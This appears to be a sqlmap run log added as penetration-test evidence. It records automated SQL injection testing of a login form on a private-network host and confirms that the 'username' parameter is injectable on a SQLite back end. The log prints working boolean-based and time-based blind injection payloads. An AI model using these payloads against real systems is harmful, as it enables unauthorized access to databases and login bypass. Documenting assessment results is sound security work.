@@ -1,0 +1,79 @@
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.10.2#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:40:01 /2026-11-20/
+
+[14:40:01] [WARNING] using '/home/kali/vapt-evidence/sqlmap' as the output directory
+[1/1] URL:
+GET http://192.168.56.1:5444/login
+POST data: username=x&password=x
+do you want to test this URL? [Y/n/q]
+> Y
+[14:40:01] [INFO] testing URL 'http://192.168.56.1:5444/login'
+[14:40:01] [INFO] flushing session file
+[14:40:01] [INFO] using '/home/kali/vapt-evidence/sqlmap/results-11202026_0240pm.csv' as the CSV results file in multiple targets mode
+[14:40:01] [INFO] testing connection to the target URL
+[14:40:01] [INFO] checking if the target is protected by some kind of WAF/IPS
+[14:40:02] [INFO] testing if the target URL content is stable
+[14:40:02] [INFO] target URL content is stable
+[14:40:02] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
+[14:40:02] [INFO] testing for SQL injection on POST parameter 'username'
+[14:40:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:40:07] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+got a 302 redirect to 'http://192.168.56.1:5444/'. Do you want to follow? [Y/n] Y
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
+[14:40:08] [INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
+[14:40:10] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite' 
+it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+[14:40:11] [INFO] testing 'Generic inline queries'
+[14:40:11] [INFO] testing 'SQLite inline queries'
+[14:40:11] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
+[14:40:11] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
+[14:40:11] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
+[14:40:11] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query)'
+[14:40:56] [INFO] POST parameter 'username' appears to be 'SQLite > 2.0 OR time-based blind (heavy query)' injectable 
+[14:40:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[14:40:56] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[14:40:56] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[14:40:56] [INFO] target URL appears to have 1 column in query
+do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
+[14:40:56] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql') 
+[14:40:56] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
+[14:40:57] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
+[14:40:57] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
+[14:40:57] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
+[14:40:57] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
+[14:40:58] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
+[14:40:58] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
+[14:40:58] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
+[14:40:58] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
+[14:40:59] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+[14:40:59] [INFO] checking if the injection point on POST parameter 'username' is a false positive
+POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 385 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: username=-1024' OR 1358=1358-- GXjO&password=x
+
+    Type: time-based blind
+    Title: SQLite > 2.0 OR time-based blind (heavy query)
+    Payload: username=x' OR 8728=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- bNtp&password=x
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[14:41:00] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[14:41:00] [WARNING] HTTP error codes detected during run:
+401 (Unauthorized) - 97 times, 500 (Internal Server Error) - 280 times
+[14:41:00] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/vapt-evidence/sqlmap/results-11202026_0240pm.csv'
+[14:41:00] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 14:41:00 /2026-11-20/
+
